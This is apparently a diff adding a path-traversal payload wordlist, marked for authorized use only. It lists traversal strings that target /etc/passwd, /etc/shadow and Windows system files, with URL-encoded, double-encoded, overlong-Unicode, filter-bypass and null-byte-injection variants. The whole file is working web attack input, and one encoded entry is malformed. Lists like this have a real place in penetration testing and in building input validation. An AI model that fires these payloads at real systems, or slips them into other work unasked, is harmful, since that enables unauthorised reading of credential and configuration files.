@@ -1,0 +1,94 @@
+# Path Traversal Payloads
+# Use only on authorized systems
+
+# Basic path traversal (Linux)
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+
+# Unix/Linux targets
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../etc/shadow
+../../../../etc/shadow
+../../../etc/hosts
+../../../../etc/hosts
+../../../etc/group
+../../../../etc/group
+
+# Windows targets
+..\..\
+..\..\..\
+..\..\..\..\
+..\..\..\..\..\
+..\..\..\..\..\..\
+..\..\..\..\..\..\..\
+
+# Windows files
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\win.ini
+..\..\..\..\windows\system.ini
+..\..\..\boot.ini
+
+# Absolute paths
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/group
+C:\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+
+# Encoded traversal
+..%2f
+..%2f..%2f
+..%2f..%2f..%2f
+%2e%2e%2f
+%2e%2e%2f%2e%2e%2f
+%2e%2e%2f%2e%2e%2f%2e%2e%2f
+
+# Double encoding
+..%252f
+..%252f..%252f
+..%252f..%252f..%252f
+%252e%252e%252f
+%252e%252e%252f%252e%252e%252f
+
+# Unicode encoding
+..%c0%af
+..%c0%af..%c0%af
+..%c1%9c
+..%c0%9v..%c0%9v
+
+# Filter bypass
+....//
+....//....//
+....//....//....//
+....//../
+....//../....//../
+
+# Mixed encoding
+..%2F
+..%5C
+..%c0%af
+..%252f
+....%2f
+....%5c
+
+# Null byte injection
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.png
+
+# Combination attacks
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+....//....//etc/passwd%00
